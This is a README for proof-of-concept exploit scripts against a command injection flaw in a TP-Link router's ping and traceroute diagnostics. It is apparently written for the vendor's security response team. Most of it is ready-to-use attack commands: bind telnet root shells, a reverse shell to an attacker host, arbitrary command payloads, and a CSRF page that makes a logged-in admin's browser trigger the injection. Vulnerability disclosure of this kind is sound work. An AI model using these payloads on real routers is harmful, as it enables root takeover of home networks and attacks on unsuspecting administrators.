# Proof-of-Concept Scripts

Both scripts target the same vulnerability — `IPPING_DIAG.host` / `TRACEROUTE_DIAG.host` command injection in `oal_startPing()` / `oal_startTraceroute()` inside `libcmm.so`.

| File                          | Scope                                                                                  |
|-------------------------------|----------------------------------------------------------------------------------------|
| `exploit.py`                  | Full PoC. Auto-detects GDPR (v14 Build 260107) vs RPM (v8–v13) firmware. Four payload modes. CSRF HTML generator. |
| `exploit_wr841n_ipping.py`    | Standalone reference implementation, GDPR-only. Easier to read for code review.        |

## Dependencies

```bash
pip install pycryptodome requests --break-system-packages
```

Python 3.8+.

## Usage — `exploit.py`

```text
-t / --target        Router IP or URL                    (required)
-u / --username      Admin username                      (default: admin)
-p / --password      Admin password                      (default: admin)
--vector             ping | traceroute                   (default: ping)
--payload            telnetd | bind | revshell | cmd     (required for direct exploit)
--bind-port          Port for telnetd / bind payloads    (default: 4444)
--lhost              Attacker IP for revshell
--lport              Attacker port for revshell
--cmd                Arbitrary OS command (--payload cmd)
--fw                 auto | gdpr | rpm                   (default: auto)
--csrf               Generate CSRF HTML PoC instead of direct exploit
-o / --output        Output file path (--csrf)
-v / --verbose       Print request details and crypto internals
```

### Examples

#### Bind telnet shell — authenticated
```bash
python3 exploit.py -t 192.168.0.1 -u admin -p admin --payload telnetd
telnet 192.168.0.1 4444   # uid=0(root)
```

#### Reverse shell — authenticated
```bash
# attacker:
nc -lvnp 4444
# trigger:
python3 exploit.py -t 192.168.0.1 -u admin -p admin \
    --payload revshell --lhost <ATTACKER_IP> --lport 4444
```

#### Non-destructive verification (safe for vendor QA)
```bash
python3 exploit.py -t 192.168.0.1 -u admin -p admin \
    --payload cmd --cmd 'id > /tmp/pwned'
# Verify: serial console or chained read → uid=0(root) gid=0(root)
```

#### Traceroute injection vector
```bash
python3 exploit.py -t 192.168.0.1 -u admin -p admin \
    --vector traceroute --payload bind --bind-port 9999
nc 192.168.0.1 9999
```

#### CSRF HTML payload — no attacker credentials required
```bash
python3 exploit.py -t 192.168.0.1 --csrf --payload telnetd -o csrf.html
python3 -m http.server 8080
# Admin visits http://<attacker>:8080/csrf.html while logged in to router
# → router runs: telnetd -l /bin/sh -p 4444 &
```

#### Legacy RPM firmware (v8–v13)
```bash
python3 exploit.py -t 192.168.0.1 --fw rpm -u admin -p admin --payload telnetd
```

## Usage — `exploit_wr841n_ipping.py`

A simpler standalone implementation of just the GDPR (v14) attack chain for code-review purposes. Same default usage:

```bash
python3 exploit_wr841n_ipping.py 192.168.0.1 admin admin "telnetd -l /bin/sh -p 4444 &"
```

## Notes for the TP-Link PSIRT

- All requests go to `/cgi_gdpr` with `Content-Type: text/plain` and body `sign=<hex>\r\ndata=<base64>\r\n`.
- The RSA public key (`ee`, `nn`) and sequence number (`seq`) are scraped from the JS in `GET /`.
- AES-128-CBC with PKCS7 padding; key/IV are 16-digit decimal strings generated per session.
- RSA-512 PKCS#1 v1.5 signature; input chunked at 53 bytes when longer than one block.
- Session cookie name on success: `Authorization=<token>`.
- Verbose mode (`-v`) prints intermediate values so the validation team can step through each crypto layer.
